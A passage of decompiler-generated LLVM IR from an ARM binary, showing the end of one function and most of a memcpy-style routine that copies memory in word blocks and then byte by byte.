.thread14:                                        ; preds = %dec_label_pc_1b1c8, %bb
  %v1_1b1d4 = phi i1 [ %v1_1b1d4.pre, %bb ], [ %v9_1b1c8, %dec_label_pc_1b1c8 ]
  %v0_1b1d4 = phi i1 [ %v0_1b1d4.pre, %bb ], [ %v3_1b1c8, %dec_label_pc_1b1c8 ]
  %v2_1b1d4 = xor i1 %v1_1b1d4, true
  %v3_1b1d4 = and i1 %v0_1b1d4, %v2_1b1d4
  br i1 %v3_1b1d4, label %.dec_label_pc_1b1dc_crit_edge, label %dec_label_pc_1b1d8

.dec_label_pc_1b1dc_crit_edge:                    ; preds = %.thread14
  %v0_1b1dc.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1b1dc

dec_label_pc_1b1d8:                               ; preds = %entry, %dec_label_pc_1b1a4, %.thread14
  br label %dec_label_pc_1b1dc

dec_label_pc_1b1dc:                               ; preds = %.dec_label_pc_1b1dc_crit_edge, %dec_label_pc_1b1d8
  %v0_1b1dc = phi i32 [ %v0_1b1dc.pre, %.dec_label_pc_1b1dc_crit_edge ], [ 0, %dec_label_pc_1b1d8 ]
  store i32 %v6_1b14c, i32* @r5, align 4
  ret i32 %v0_1b1dc

; uselistorder directives
  uselistorder i1 %v9_1b1c8, { 1, 0, 2 }
  uselistorder i32 %v1_1b1c8, { 1, 0 }
  uselistorder i32 %v0_1b1c8, { 0, 2, 1 }
  uselistorder i32 %v0_1b1c0, { 2, 0, 1 }
  uselistorder i32 %v0_1b1b8, { 1, 0 }
  uselistorder i32 %v3_1b194, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1b184, { 1, 0 }
  uselistorder i32 %v3_1b16c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1b190, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i32 (i16*)* @getc_unlocked, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1b1dc, { 1, 0 }
  uselistorder label %dec_label_pc_1b1d8, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_1b1c8, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_1b16c, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_1b1f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b1f0 = load i32, i32* %r0.global-to-local, align 4
  %v2_1b1f0 = sub i32 %v0_1b1f0, %v1_1b1f0
  %v3_1b1f0 = icmp ult i32 %v0_1b1f0, %v1_1b1f0
  %v4_1b1f0 = xor i32 %v1_1b1f0, %v0_1b1f0
  %v5_1b1f0 = xor i32 %v2_1b1f0, %v0_1b1f0
  %v6_1b1f0 = and i32 %v5_1b1f0, %v4_1b1f0
  %v7_1b1f0 = icmp slt i32 %v6_1b1f0, 0
  store i1 %v7_1b1f0, i1* %cpsr_v.global-to-local, align 1
  %v8_1b1f0 = icmp slt i32 %v2_1b1f0, 0
  store i1 %v8_1b1f0, i1* %cpsr_n.global-to-local, align 1
  %v9_1b1f0 = icmp eq i32 %v0_1b1f0, %v1_1b1f0
  store i1 %v9_1b1f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1b1f0, label %dec_label_pc_1b444, label %dec_label_pc_1b1f8

dec_label_pc_1b1f8:                               ; preds = %entry
  br i1 %v9_1b1f0, label %.thread129, label %bb

.thread129:                                       ; preds = %bb153, %.thread128, %bb150, %dec_label_pc_1b1f8
  %merge = phi i32 [ %v0_1b1f0, %dec_label_pc_1b1f8 ], [ %v2_1b4d8, %bb150 ], [ %v11_1b4f4, %bb153 ], [ %v7_1b4f4, %.thread128 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_1b1f8
  %v5_1b1fc = inttoptr i32 %v1_1b1f0 to i8*
  store i8* %v5_1b1fc, i8** %stack_var_-8, align 4
  %v8_1b1fc = load i32, i32* @lr, align 4
  %v0_1b200 = load i32, i32* @r2, align 4
  %v2_1b200 = add i32 %v0_1b200, -4
  store i32 %v2_1b200, i32* %r2.global-to-local, align 4
  %v4_1b200 = sub i32 3, %v0_1b200
  %v5_1b200 = and i32 %v4_1b200, %v0_1b200
  %v6_1b200 = icmp slt i32 %v5_1b200, 0
  store i1 %v6_1b200, i1* %cpsr_v.global-to-local, align 1
  %v7_1b200 = icmp slt i32 %v2_1b200, 0
  store i1 %v7_1b200, i1* %cpsr_n.global-to-local, align 1
  %v8_1b200 = icmp eq i32 %v0_1b200, 4
  store i1 %v8_1b200, i1* %cpsr_z.global-to-local, align 1
  %v5_1b204 = icmp slt i32 %v0_1b200, 4
  br i1 %v5_1b204, label %bb140, label %dec_label_pc_1b208

dec_label_pc_1b208:                               ; preds = %bb
  %v1_1b208 = urem i32 %v1_1b1f0, 4
  store i32 %v1_1b208, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1b208 = icmp eq i32 %v1_1b208, 0
  store i1 %v2_1b208, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b208, label %dec_label_pc_1b210, label %dec_label_pc_1b2bc

dec_label_pc_1b210:                               ; preds = %dec_label_pc_1b208
  %v1_1b210 = urem i32 %v0_1b1f0, 4
  store i32 %v1_1b210, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1b210 = icmp eq i32 %v1_1b210, 0
  store i1 %v2_1b210, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_1b1f0 to i2
  br i1 %v2_1b210, label %dec_label_pc_1b218, label %dec_label_pc_1b2ec

dec_label_pc_1b218:                               ; preds = %dec_label_pc_1b210, %dec_label_pc_1b2e4
  %v0_1b23093 = phi i32 [ %v1_1b1f0, %dec_label_pc_1b210 ], [ %v0_1b40c76, %dec_label_pc_1b2e4 ]
  %v0_1b22c92 = phi i32 [ %v0_1b1f0, %dec_label_pc_1b210 ], [ %v0_1b2e4, %dec_label_pc_1b2e4 ]
  %v0_1b218 = phi i32 [ %v2_1b200, %dec_label_pc_1b210 ], [ %v2_1b2dc, %dec_label_pc_1b2e4 ]
  %v1_1b218 = add i32 %v0_1b218, -8
  store i32 %v1_1b218, i32* %r2.global-to-local, align 4
  %v3_1b218 = sub i32 7, %v0_1b218
  %v4_1b218 = and i32 %v3_1b218, %v0_1b218
  %v5_1b218 = icmp slt i32 %v4_1b218, 0
  store i1 %v5_1b218, i1* %cpsr_v.global-to-local, align 1
  %v6_1b218 = icmp slt i32 %v1_1b218, 0
  store i1 %v6_1b218, i1* %cpsr_n.global-to-local, align 1
  %v7_1b218 = icmp eq i32 %v0_1b218, 8
  store i1 %v7_1b218, i1* %cpsr_z.global-to-local, align 1
  %v2_1b21c = xor i1 %v6_1b218, %v5_1b218
  br i1 %v2_1b21c, label %dec_label_pc_1b26c, label %dec_label_pc_1b220

dec_label_pc_1b220:                               ; preds = %dec_label_pc_1b218
  %v1_1b220 = add i32 %v0_1b218, -28
  store i32 %v1_1b220, i32* %r2.global-to-local, align 4
  %v3_1b220 = sub i32 27, %v0_1b218
  %v4_1b220 = and i32 %v3_1b220, %v1_1b218
  %v5_1b220 = icmp slt i32 %v4_1b220, 0
  store i1 %v5_1b220, i1* %cpsr_v.global-to-local, align 1
  %v6_1b220 = icmp slt i32 %v1_1b220, 0
  store i1 %v6_1b220, i1* %cpsr_n.global-to-local, align 1
  %v7_1b220 = icmp eq i32 %v1_1b218, 20
  store i1 %v7_1b220, i1* %cpsr_z.global-to-local, align 1
  %v2_1b224 = xor i1 %v6_1b220, %v5_1b220
  br i1 %v2_1b224, label %dec_label_pc_1b258, label %dec_label_pc_1b228

dec_label_pc_1b228:                               ; preds = %dec_label_pc_1b220
  %v0_1b228 = load i32, i32* @r4, align 4
  store i32 %v0_1b228, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1b22c

dec_label_pc_1b22c:                               ; preds = %dec_label_pc_1b22c.dec_label_pc_1b22c_crit_edge, %dec_label_pc_1b228
  %v0_1b230 = phi i32 [ %v12_1b238, %dec_label_pc_1b22c.dec_label_pc_1b22c_crit_edge ], [ %v0_1b23093, %dec_label_pc_1b228 ]
  %v0_1b22c = phi i32 [ %v0_1b22c.pre, %dec_label_pc_1b22c.dec_label_pc_1b22c_crit_edge ], [ %v0_1b22c92, %dec_label_pc_1b228 ]
  %v1_1b22c = inttoptr i32 %v0_1b22c to i32*
  %v2_1b22c = load i32, i32* %v1_1b22c, align 4
  %v3_1b22c = add i32 %v0_1b22c, 4
  %v4_1b22c = inttoptr i32 %v3_1b22c to i32*
  %v5_1b22c = load i32, i32* %v4_1b22c, align 4
  store i32 %v5_1b22c, i32* %r4.global-to-local, align 4
  %v6_1b22c = add i32 %v0_1b22c, 8
  %v7_1b22c = inttoptr i32 %v6_1b22c to i32*
  %v8_1b22c = load i32, i32* %v7_1b22c, align 4
  store i32 %v8_1b22c, i32* %ip.global-to-local, align 4
  %v9_1b22c = add i32 %v0_1b22c, 12
  %v10_1b22c = inttoptr i32 %v9_1b22c to i32*
  %v11_1b22c = load i32, i32* %v10_1b22c, align 4
  store i32 %v11_1b22c, i32* %lr.global-to-local, align 4
  %v12_1b22c = add i32 %v0_1b22c, 16
  store i32 %v12_1b22c, i32* %r1.global-to-local, align 4
  %v1_1b230 = inttoptr i32 %v0_1b230 to i32*
  store i32 %v2_1b22c, i32* %v1_1b230, align 4
  %v3_1b230 = add i32 %v0_1b230, 4
  %v4_1b230 = inttoptr i32 %v3_1b230 to i32*
  %v5_1b230 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1b230, i32* %v4_1b230, align 4
  %v6_1b230 = add i32 %v0_1b230, 8
  %v7_1b230 = inttoptr i32 %v6_1b230 to i32*
  %v8_1b230 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_1b230, i32* %v7_1b230, align 4
  %v9_1b230 = add i32 %v0_1b230, 12
  %v10_1b230 = inttoptr i32 %v9_1b230 to i32*
  %v11_1b230 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_1b230, i32* %v10_1b230, align 4
  %v12_1b230 = add i32 %v0_1b230, 16
  store i32 %v12_1b230, i32* %r0.global-to-local, align 4
  %v0_1b234 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b234 = inttoptr i32 %v0_1b234 to i32*
  %v2_1b234 = load i32, i32* %v1_1b234, align 4
  store i32 %v2_1b234, i32* @r3, align 4
  %v3_1b234 = add i32 %v0_1b234, 4
  %v4_1b234 = inttoptr i32 %v3_1b234 to i32*
  %v5_1b234 = load i32, i32* %v4_1b234, align 4
  store i32 %v5_1b234, i32* %r4.global-to-local, align 4
  %v6_1b234 = add i32 %v0_1b234, 8
  %v7_1b234 = inttoptr i32 %v6_1b234 to i32*
  %v8_1b234 = load i32, i32* %v7_1b234, align 4
  store i32 %v8_1b234, i32* @ip, align 4
  %v9_1b234 = add i32 %v0_1b234, 12
  %v10_1b234 = inttoptr i32 %v9_1b234 to i32*
  %v11_1b234 = load i32, i32* %v10_1b234, align 4
  store i32 %v11_1b234, i32* %lr.global-to-local, align 4
  %v12_1b234 = add i32 %v0_1b234, 16
  store i32 %v12_1b234, i32* %r1.global-to-local, align 4
  %v1_1b238 = inttoptr i32 %v12_1b230 to i32*
  store i32 %v2_1b234, i32* %v1_1b238, align 4
  %v3_1b238 = add i32 %v0_1b230, 20
  %v4_1b238 = inttoptr i32 %v3_1b238 to i32*
  %v5_1b238 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1b238, i32* %v4_1b238, align 4
  %v6_1b238 = add i32 %v0_1b230, 24
  %v7_1b238 = inttoptr i32 %v6_1b238 to i32*
  %v8_1b238 = load i32, i32* @ip, align 4
  store i32 %v8_1b238, i32* %v7_1b238, align 4
  %v9_1b238 = add i32 %v0_1b230, 28
  %v10_1b238 = inttoptr i32 %v9_1b238 to i32*
  %v11_1b238 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_1b238, i32* %v10_1b238, align 4
  %v12_1b238 = add i32 %v0_1b230, 32
  store i32 %v12_1b238, i32* %r0.global-to-local, align 4
  %v0_1b23c = load i32, i32* %r2.global-to-local, align 4
  %v1_1b23c = add i32 %v0_1b23c, -32
  store i32 %v1_1b23c, i32* %r2.global-to-local, align 4
  %v3_1b23c = sub i32 31, %v0_1b23c
  %v4_1b23c = and i32 %v3_1b23c, %v0_1b23c
  %v5_1b23c = icmp slt i32 %v4_1b23c, 0
  %v6_1b23c = icmp slt i32 %v1_1b23c, 0
  %v2_1b240 = xor i1 %v6_1b23c, %v5_1b23c
  br i1 %v2_1b240, label %dec_label_pc_1b244, label %dec_label_pc_1b22c.dec_label_pc_1b22c_crit_edge

dec_label_pc_1b22c.dec_label_pc_1b22c_crit_edge:  ; preds = %dec_label_pc_1b22c
  %v0_1b22c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b22c

dec_label_pc_1b244:                               ; preds = %dec_label_pc_1b22c
  %v1_1b244 = add i32 %v0_1b23c, -16
  %v3_1b244 = add i32 %v0_1b23c, 2147483616
  %v4_1b244 = and i32 %v1_1b244, %v3_1b244
  %v5_1b244 = icmp slt i32 %v4_1b244, 0
  store i1 %v5_1b244, i1* %cpsr_v.global-to-local, align 1
  %v6_1b244 = icmp slt i32 %v1_1b244, 0
  store i1 %v6_1b244, i1* %cpsr_n.global-to-local, align 1
  %v7_1b244 = icmp eq i32 %v1_1b244, 0
  store i1 %v7_1b244, i1* %cpsr_z.global-to-local, align 1
  %v2_1b248 = xor i1 %v6_1b244, %v5_1b244
  br i1 %v2_1b248, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_1b244
  %v3_1b248 = load i32, i32* %r1.global-to-local, align 4
  %v4_1b248 = inttoptr i32 %v3_1b248 to i32*
  %v5_1b248 = load i32, i32* %v4_1b248, align 4
  store i32 %v5_1b248, i32* @r3, align 4
  %v6_1b248 = add i32 %v3_1b248, 4
  %v7_1b248 = inttoptr i32 %v6_1b248 to i32*
  %v8_1b248 = load i32, i32* %v7_1b248, align 4
  store i32 %v8_1b248, i32* %r4.global-to-local, align 4
  %v9_1b248 = add i32 %v3_1b248, 8
  %v10_1b248 = inttoptr i32 %v9_1b248 to i32*
  %v11_1b248 = load i32, i32* %v10_1b248, align 4
  store i32 %v11_1b248, i32* @ip, align 4
  %v12_1b248 = add i32 %v3_1b248, 12
  %v13_1b248 = inttoptr i32 %v12_1b248 to i32*
  %v14_1b248 = load i32, i32* %v13_1b248, align 4
  store i32 %v14_1b248, i32* %lr.global-to-local, align 4
  %v15_1b248 = add i32 %v3_1b248, 16
  store i32 %v15_1b248, i32* %r1.global-to-local, align 4
  %v4_1b24c = inttoptr i32 %v12_1b238 to i32*
  store i32 %v5_1b248, i32* %v4_1b24c, align 4
  %v6_1b24c = add i32 %v0_1b230, 36
  %v7_1b24c = inttoptr i32 %v6_1b24c to i32*
  %v8_1b24c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_1b24c, i32* %v7_1b24c, align 4
  %v9_1b24c = add i32 %v0_1b230, 40
  %v10_1b24c = inttoptr i32 %v9_1b24c to i32*
  %v11_1b24c = load i32, i32* @ip, align 4
  store i32 %v11_1b24c, i32* %v10_1b24c, align 4
  %v12_1b24c = add i32 %v0_1b230, 44
  %v13_1b24c = inttoptr i32 %v12_1b24c to i32*
  %v14_1b24c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_1b24c, i32* %v13_1b24c, align 4
  %v15_1b24c = add i32 %v0_1b230, 48
  store i32 %v15_1b24c, i32* %r0.global-to-local, align 4
  %v3_1b250 = load i32, i32* %r2.global-to-local, align 4
  %v4_1b250 = add i32 %v3_1b250, -16
  store i32 %v4_1b250, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_1b244, %bb136
  %v3_1b260101110 = phi i32 [ %v15_1b24c, %bb136 ], [ %v12_1b238, %dec_label_pc_1b244 ]
  %v0_1b258.pre = phi i32 [ %v4_1b250, %bb136 ], [ %v1_1b23c, %dec_label_pc_1b244 ]
  %v2_1b254 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1b254, i32* @r4, align 4
  br label %dec_label_pc_1b258

dec_label_pc_1b258:                               ; preds = %dec_label_pc_1b220, %bb137
  %v3_1b260100 = phi i32 [ %v0_1b23093, %dec_label_pc_1b220 ], [ %v3_1b260101110, %bb137 ]
  %v0_1b258 = phi i32 [ %v1_1b220, %dec_label_pc_1b220 ], [ %v0_1b258.pre, %bb137 ]
  %v1_1b258 = add i32 %v0_1b258, 20
  store i32 %v1_1b258, i32* %r2.global-to-local, align 4
  %v3_1b258 = sub i32 0, %v0_1b258
  %v4_1b258 = and i32 %v1_1b258, %v3_1b258
  %v5_1b258 = icmp slt i32 %v4_1b258, 0
  store i1 %v5_1b258, i1* %cpsr_v.global-to-local, align 1
  %v6_1b258 = icmp slt i32 %v1_1b258, 0
  store i1 %v6_1b258, i1* %cpsr_n.global-to-local, align 1
  %v7_1b258 = icmp eq i32 %v1_1b258, 0
  store i1 %v7_1b258, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1b25c

dec_label_pc_1b25c:                               ; preds = %.thread114, %dec_label_pc_1b258
  %v0_1b26c.pre157 = phi i32 [ %v0_1b26c.pre, %.thread114 ], [ %v1_1b258, %dec_label_pc_1b258 ]
  %v3_1b260 = phi i32 [ %v3_1b26098115, %.thread114 ], [ %v3_1b260100, %dec_label_pc_1b258 ]
  %v1_1b264 = phi i1 [ %v1_1b268, %.thread114 ], [ %v5_1b258, %dec_label_pc_1b258 ]
  %v0_1b264 = phi i1 [ %v0_1b268, %.thread114 ], [ %v6_1b258, %dec_label_pc_1b258 ]
  %v2_1b25c = xor i1 %v1_1b264, %v0_1b264
  br i1 %v2_1b25c, label %.thread114, label %bb138

bb138:                                            ; preds = %dec_label_pc_1b25c
  %v3_1b25c = load i32, i32* %r1.global-to-local, align 4
  %v4_1b25c = inttoptr i32 %v3_1b25c to i32*
  %v5_1b25c = load i32, i32* %v4_1b25c, align 4
  store i32 %v5_1b25c, i32* @r3, align 4
  %v6_1b25c = add i32 %v3_1b25c, 4
  %v7_1b25c = inttoptr i32 %v6_1b25c to i32*
  %v8_1b25c = load i32, i32* %v7_1b25c, align 4
  store i32 %v8_1b25c, i32* @ip, align 4
  %v9_1b25c = add i32 %v3_1b25c, 8
  %v10_1b25c = inttoptr i32 %v9_1b25c to i32*
  %v11_1b25c = load i32, i32* %v10_1b25c, align 4
  store i32 %v11_1b25c, i32* %lr.global-to-local, align 4
  %v12_1b25c = add i32 %v3_1b25c, 12
  store i32 %v12_1b25c, i32* %r1.global-to-local, align 4
  %v4_1b260 = inttoptr i32 %v3_1b260 to i32*
  store i32 %v5_1b25c, i32* %v4_1b260, align 4
  %v6_1b260 = add i32 %v3_1b260, 4
  %v7_1b260 = inttoptr i32 %v6_1b260 to i32*
  %v8_1b260 = load i32, i32* @ip, align 4
  store i32 %v8_1b260, i32* %v7_1b260, align 4
  %v9_1b260 = add i32 %v3_1b260, 8
  %v10_1b260 = inttoptr i32 %v9_1b260 to i32*
  %v11_1b260 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_1b260, i32* %v10_1b260, align 4
  %v12_1b260 = add i32 %v3_1b260, 12
  store i32 %v12_1b260, i32* %r0.global-to-local, align 4
  %v3_1b264 = load i32, i32* %r2.global-to-local, align 4
  %v4_1b264 = add i32 %v3_1b264, -12
  store i32 %v4_1b264, i32* %r2.global-to-local, align 4
  %v6_1b264 = sub i32 11, %v3_1b264
  %v7_1b264 = and i32 %v6_1b264, %v3_1b264
  %v8_1b264 = icmp slt i32 %v7_1b264, 0
  store i1 %v8_1b264, i1* %cpsr_v.global-to-local, align 1
  %v9_1b264 = icmp slt i32 %v4_1b264, 0
  store i1 %v9_1b264, i1* %cpsr_n.global-to-local, align 1
  %v10_1b264 = icmp eq i32 %v3_1b264, 12
  store i1 %v10_1b264, i1* %cpsr_z.global-to-local, align 1
  br label %.thread114

.thread114:                                       ; preds = %dec_label_pc_1b25c, %bb138
  %v0_1b26c.pre = phi i32 [ %v4_1b264, %bb138 ], [ %v0_1b26c.pre157, %dec_label_pc_1b25c ]
  %v3_1b26098115 = phi i32 [ %v12_1b260, %bb138 ], [ %v3_1b260, %dec_label_pc_1b25c ]
  %v1_1b268 = phi i1 [ %v8_1b264, %bb138 ], [ %v1_1b264, %dec_label_pc_1b25c ]
  %v0_1b268 = phi i1 [ %v9_1b264, %bb138 ], [ %v0_1b264, %dec_label_pc_1b25c ]
  %v2_1b268 = xor i1 %v1_1b268, %v0_1b268
  br i1 %v2_1b268, label %dec_label_pc_1b26c, label %dec_label_pc_1b25c

dec_label_pc_1b26c:                               ; preds = %.thread114, %dec_label_pc_1b218
  %v4_1b27c = phi i32 [ %v0_1b23093, %dec_label_pc_1b218 ], [ %v3_1b26098115, %.thread114 ]
  %v0_1b26c = phi i32 [ %v1_1b218, %dec_label_pc_1b218 ], [ %v0_1b26c.pre, %.thread114 ]
  %v1_1b26c = add i32 %v0_1b26c, 8
  store i32 %v1_1b26c, i32* %r2.global-to-local, align 4
  %v3_1b26c = sub i32 0, %v0_1b26c
  %v4_1b26c = and i32 %v1_1b26c, %v3_1b26c
  %v5_1b26c = icmp slt i32 %v4_1b26c, 0
  store i1 %v5_1b26c, i1* %cpsr_v.global-to-local, align 1
  %v6_1b26c = icmp slt i32 %v1_1b26c, 0
  store i1 %v6_1b26c, i1* %cpsr_n.global-to-local, align 1
  %v7_1b26c = icmp eq i32 %v1_1b26c, 0
  store i1 %v7_1b26c, i1* %cpsr_z.global-to-local, align 1
  %v2_1b270 = xor i1 %v6_1b26c, %v5_1b26c
  br i1 %v2_1b270, label %bb140, label %dec_label_pc_1b274

dec_label_pc_1b274:                               ; preds = %dec_label_pc_1b26c
  %v1_1b274 = add i32 %v0_1b26c, 4
  store i32 %v1_1b274, i32* %r2.global-to-local, align 4
  %v3_1b274 = sub i32 -5, %v0_1b26c
  %v4_1b274 = and i32 %v3_1b274, %v1_1b26c
  %v5_1b274 = icmp slt i32 %v4_1b274, 0
  store i1 %v5_1b274, i1* %cpsr_v.global-to-local, align 1
  %v6_1b274 = icmp slt i32 %v1_1b274, 0
  store i1 %v6_1b274, i1* %cpsr_n.global-to-local, align 1
  %v7_1b274 = icmp eq i32 %v1_1b26c, 4
  store i1 %v7_1b274, i1* %cpsr_z.global-to-local, align 1
  %v2_1b278 = xor i1 %v6_1b274, %v5_1b274
  %v3_1b278 = load i32, i32* %r1.global-to-local, align 4
  %v4_1b278 = inttoptr i32 %v3_1b278 to i32*
  %v5_1b278 = load i32, i32* %v4_1b278, align 4
  store i32 %v5_1b278, i32* @r3, align 4
  %v7_1b278 = add i32 %v3_1b278, 4
  br i1 %v2_1b278, label %.thread121, label %bb139

.thread121:                                       ; preds = %dec_label_pc_1b274
  store i32 %v7_1b278, i32* %r1.global-to-local, align 4
  %v5_1b27c = inttoptr i32 %v4_1b27c to i32*
  store i32 %v5_1b278, i32* %v5_1b27c, align 4
  %v6_1b27c = load i32, i32* %r0.global-to-local, align 4
  %v7_1b27c = add i32 %v6_1b27c, 4
  store i32 %v7_1b27c, i32* %r0.global-to-local, align 4
  %v0_1b28c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_1b274
  %v7_1b280 = inttoptr i32 %v7_1b278 to i32*
  %v8_1b280 = load i32, i32* %v7_1b280, align 4
  store i32 %v8_1b280, i32* @ip, align 4
  %v9_1b280 = add i32 %v3_1b278, 8
  store i32 %v9_1b280, i32* %r1.global-to-local, align 4
  %v4_1b284 = inttoptr i32 %v4_1b27c to i32*
  store i32 %v5_1b278, i32* %v4_1b284, align 4
  %v6_1b284 = add i32 %v4_1b27c, 4
  %v7_1b284 = inttoptr i32 %v6_1b284 to i32*
  %v8_1b284 = load i32, i32* @ip, align 4
  store i32 %v8_1b284, i32* %v7_1b284, align 4
  %v9_1b284 = add i32 %v4_1b27c, 8
  store i32 %v9_1b284, i32* %r0.global-to-local, align 4
  %v3_1b288 = load i32, i32* %r2.global-to-local, align 4
  %v4_1b288 = add i32 %v3_1b288, -4
  store i32 %v4_1b288, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread121, %.thread127, %dec_label_pc_1b26c, %bb, %dec_label_pc_1b43c, %dec_label_pc_1b3d0, %dec_label_pc_1b364, %bb139
  %v0_1b28c = phi i32 [ %v0_1b28c.pre, %.thread121 ], [ %v2_1b2dc, %.thread127 ], [ %v1_1b26c, %dec_label_pc_1b26c ], [ %v2_1b200, %bb ], [ %v0_1b28c60, %dec_label_pc_1b43c ], [ %v0_1b28c59, %dec_label_pc_1b3d0 ], [ %v0_1b28c58, %dec_label_pc_1b364 ], [ %v4_1b288, %bb139 ]
  %v1_1b28c = add i32 %v0_1b28c, 4
  store i32 %v1_1b28c, i32* %r2.global-to-local, align 4
  %v3_1b28c = sub i32 0, %v0_1b28c
  %v4_1b28c = and i32 %v1_1b28c, %v3_1b28c
  %v5_1b28c = icmp slt i32 %v4_1b28c, 0
  store i1 %v5_1b28c, i1* %cpsr_v.global-to-local, align 1
  %v6_1b28c = icmp slt i32 %v1_1b28c, 0
  store i1 %v6_1b28c, i1* %cpsr_n.global-to-local, align 1
  %v7_1b28c = icmp eq i32 %v1_1b28c, 0
  store i1 %v7_1b28c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1b28c, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_1b294.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_1b290 = load i8*, i8** %stack_var_-8, align 4
  %v4_1b290 = ptrtoint i8* %v3_1b290 to i32
  store i32 %v4_1b290, i32* %r0.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_1b294 = phi i32 [ %v0_1b294.pre, %bb140.bb142_crit_edge ], [ %v8_1b1fc, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_1b28c, i32 %v0_1b294)
  %v0_1b298 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b298 = add i32 %v0_1b298, -2
  %v3_1b298 = sub i32 1, %v0_1b298
  %v4_1b298 = and i32 %v3_1b298, %v0_1b298
  %v5_1b298 = icmp slt i32 %v4_1b298, 0
  store i1 %v5_1b298, i1* %cpsr_v.global-to-local, align 1
  %v6_1b298 = icmp slt i32 %v1_1b298, 0
  store i1 %v6_1b298, i1* %cpsr_n.global-to-local, align 1
  %v7_1b298 = icmp eq i32 %v0_1b298, 2
  store i1 %v7_1b298, i1* %cpsr_z.global-to-local, align 1
  %v0_1b29c = load i32, i32* %r1.global-to-local, align 4
  %v1_1b29c = inttoptr i32 %v0_1b29c to i8*
  %v2_1b29c = load i8, i8* %v1_1b29c, align 1
  %v5_1b29c = add i32 %v0_1b29c, 1
  store i32 %v5_1b29c, i32* %r1.global-to-local, align 4
  %v2_1b2a0 = load i32, i32* %r0.global-to-local, align 4
  %v3_1b2a0 = inttoptr i32 %v2_1b2a0 to i8*
  store i8 %v2_1b29c, i8* %v3_1b2a0, align 1
  %v4_1b2a0 = load i32, i32* %r0.global-to-local, align 4
  %v5_1b2a0 = add i32 %v4_1b2a0, 1
  store i32 %v5_1b2a0, i32* %r0.global-to-local, align 4
  %v0_1b2a4 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1b2a4 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1b2a4 = xor i1 %v0_1b2a4, %v1_1b2a4
  br i1 %v2_1b2a4, label %.thread124, label %bb143

bb143:                                            ; preds = %bb142
  %v3_1b2a4 = load i32, i32* %r1.global-to-local, align 4
  %v4_1b2a4 = inttoptr i32 %v3_1b2a4 to i8*
  %v5_1b2a4 = load i8, i8* %v4_1b2a4, align 1
  %v8_1b2a4 = add i32 %v3_1b2a4, 1
  store i32 %v8_1b2a4, i32* %r1.global-to-local, align 4
  %v6_1b2a8 = inttoptr i32 %v5_1b2a0 to i8*
  store i8 %v5_1b2a4, i8* %v6_1b2a8, align 1
  %v7_1b2a8 = load i32, i32* %r0.global-to-local, align 4
  %v8_1b2a8 = add i32 %v7_1b2a8, 1
  store i32 %v8_1b2a8, i32* %r0.global-to-local, align 4
  %v1_1b2ac.pre = load i1, i1* %cpsr_n.global-to-local, align 1
